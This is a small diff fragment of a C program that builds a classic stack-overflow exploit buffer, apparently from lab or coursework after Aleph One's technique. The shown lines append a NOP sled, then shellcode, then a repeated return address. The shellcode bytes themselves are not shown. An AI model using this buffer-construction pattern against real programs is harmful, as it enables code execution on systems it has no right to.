@@ -22,7 +22,7 @@ int main(void)
   {
   	strcat(str, "\x90");
   }
-  strcat(str, shellcodeAlephOne);
+  strcat(str, shellcode);
   for (int i = 0; i < 38; ++i)
   {
   	// strcat(str, "\x2c\xfb\xff\xbf");
